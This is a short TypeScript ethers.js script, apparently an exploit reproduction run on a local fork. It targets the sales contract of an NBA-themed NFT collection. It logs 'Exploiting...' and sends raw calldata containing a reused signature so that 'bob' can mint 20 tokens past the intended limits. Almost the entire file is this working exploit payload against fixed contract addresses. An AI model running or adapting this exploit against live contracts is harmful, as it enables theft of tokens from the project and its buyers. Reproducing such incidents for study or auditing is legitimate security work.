import { Wallet } from 'ethers';
import { getDefaultProvider } from '@ethersproject/providers';
import { TheAssociationSales__factory, TheAssociationToken__factory } from './types/ethers-contracts';


const provider = getDefaultProvider("http://127.0.0.1:8545");
const bobPrivateKey = "";
const bob = new Wallet(bobPrivateKey, provider)

;(async () => {
  await work();
})()

async function work() {
  let mint = await new TheAssociationSales__factory().attach("0xdd5a649fc076886dfd4b9ad6acfc9b5eb882e83c").connect(bob);
  let nft = await new TheAssociationToken__factory().attach("0x9b8b9c7c02be0bd0aa4d669bf6a1f6003424c6dc").connect(bob);

  let mintNumber: string | number = 20
  mintNumber = mintNumber.toString(16);
  mintNumber = Array(65 - mintNumber.length).join("0") + mintNumber;

  console.log("Exploiting...")

  await bob.sendTransaction({
    data: `0x8df9da460000000000000000000000000000000000000000000000000000000000000060${mintNumber}0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000010000000000000000000000004d1d535d9aed1944fd7c150934f61d2efecabf1d0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000014b230ce300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000418dd9ed856064726e30a9a40125f7d16189500f24aaa1d08c7a15b79ca739734772a90ace41e1111a0350ed18cdfcba98a6e5db80a94757383b898dc6068b6dc41b00000000000000000000000000000000000000000000000000000000000000`,
    to: mint.address,
  })

  console.log("Balanceof NBA NFTs:", await (await nft.balanceOf(bob.address)).toString())
}
